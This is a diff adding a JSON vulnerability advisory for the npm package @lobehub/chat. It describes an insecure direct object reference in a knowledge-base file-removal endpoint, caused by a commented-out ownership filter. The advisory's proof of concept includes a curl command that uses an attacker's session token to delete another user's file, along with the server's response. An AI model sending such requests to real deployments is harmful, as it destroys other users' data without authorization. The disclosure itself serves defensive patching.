@@ -1,0 +1,56 @@
+{
+  "Severity": "LOW",
+  "UpdatedAt": "2026-01-20T17:14:40Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@lobehub/chat"
+  },
+  "Advisory": {
+    "DatabaseId": 332932,
+    "Id": "GSA_kwCzR0hTQS1qN3hwLTRtZzkteDI4cs4ABRSE",
+    "GhsaId": "GHSA-j7xp-4mg9-x28r",
+    "References": [
+      {
+        "Url": "https://github.com/lobehub/lobe-chat/security/advisories/GHSA-j7xp-4mg9-x28r"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-23522"
+      },
+      {
+        "Url": "https://github.com/lobehub/lobe-chat/commit/2c1762b85acb84467ed5e799afe1499cd2f912e6"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-j7xp-4mg9-x28r"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-j7xp-4mg9-x28r"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-23522"
+      }
+    ],
+    "Description": "### Summary\n\n`knowledgeBase.removeFilesFromKnowledgeBase` tRPC ep allows authenticated users to delete files from any knowledge base without verifying ownership.\n\n### Details\n\n`userId` filter in the database query is commented out, so it's enabling attackers to delete other users' KB files if they know the knowledge base ID and file ID.\n\n### PoC\n\n```\nATTACKER_TOKEN=\"xx\"\n\nVICTIM_KB=\"kb_tuLBfskdDN1r\"\nVICTIM_FILE=\"file_v5wCNLqSaoPp\"\n\ncurl -X POST \"https://localhost/trpc/lambda/knowledgeBase.removeFilesFromKnowledgeBase?batch=1\" -H \"Content-Type: application/json\" -b \"__Secure-better-auth.session_token=$ATTACKER_TOKEN\" -d '{\"0\":{\"json\":{\"knowledgeBaseId\":\"'\"$VICTIM_KB\"'\",\"ids\":[\"'\"$VICTIM_FILE\"'\"]}}}'\n```\n\nResponse:\n\n`{\"result\":{\"data\":{\"json\":{\"command\":\"DELETE\",\"rowCount\":1,\"oid\":null,\"rows\":[],\"fields\":[]}}}}`\n\n### Impact\n\nAn attacker can delete files from any user's KB. RAG/AI functionality broken when files removed. It could cause loss of important documents, proprietary data etc.\n\nWhile the vuln is confirmed, practical exploitation requires knowing target's KB ID and target's file ID. These IDs are random and not easily enumerable. However, IDs may leak through shared links, logs, referrer headers and so on. Missing authorization check is a critical security flaw regardless.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-01-20T17:14:39Z",
+    "Severity": "LOW",
+    "Summary": "Lobe Chat has IDOR in Knowledge Base File Removal that Allows Cross User File Deletion",
+    "UpdatedAt": "2026-01-20T17:14:40Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 3.7,
+      "VectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": ""
+      },
+      "VulnerableVersionRange": "\u003c= 1.143.2"
+    }
+  ]
+}
